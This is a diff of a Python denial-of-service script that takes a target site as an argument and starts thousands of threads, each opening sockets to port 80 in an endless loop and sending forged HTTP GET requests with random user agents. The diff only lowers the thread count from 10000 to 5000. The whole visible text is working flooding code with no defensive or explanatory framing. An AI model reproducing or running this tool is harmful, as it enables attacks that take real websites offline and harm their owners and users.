@@ -55,16 +55,16 @@ Keep-Alive: 115
 Connection: keep-alive'''
 
 site = sys.argv[1]
-t = [None] *10000
-a = [None] *10000
-l = [None] *10000
+t = [None] *5000
+a = [None] *5000
+l = [None] *5000
 
 def dos():
 	while 1:
 		try:
 			s = socket.socket()
 			s.connect((site, 80))
-			packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data+"\n\n Content-Length: 10000\r\n").encode('utf-8') 
+			packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data+"\n\n Content-Length: 5000\r\n").encode('utf-8') 
                         
 			s.sendto(packet, (site, 80))	
 			s.send(packet)
@@ -76,10 +76,10 @@ def dos2():
 	while 1:
 		dos()
 
-for i in range(10000):
+for i in range(5000):
 	t[i] = threading.Thread(target=dos)
-for h in range(10000):
+for h in range(5000):
 	l[h] = threading.Thread(target=dos2)
-for k in range(10000):
+for k in range(5000):
 	t[k].start()
 	l[k].start()
